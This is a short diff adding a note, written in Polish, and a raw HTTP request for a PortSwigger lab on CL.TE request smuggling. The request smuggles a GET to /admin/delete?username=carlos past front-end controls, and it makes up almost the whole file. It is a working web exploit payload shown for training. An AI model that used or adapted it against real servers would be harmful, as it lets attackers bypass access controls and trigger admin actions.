@@ -1,0 +1,24 @@
+(https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)
+
+
+Przyklad przemycenia requestu do panelu administratora ktory nie jest dostepny z servera front-endu.
+
+
+
+
+
+
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 139
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
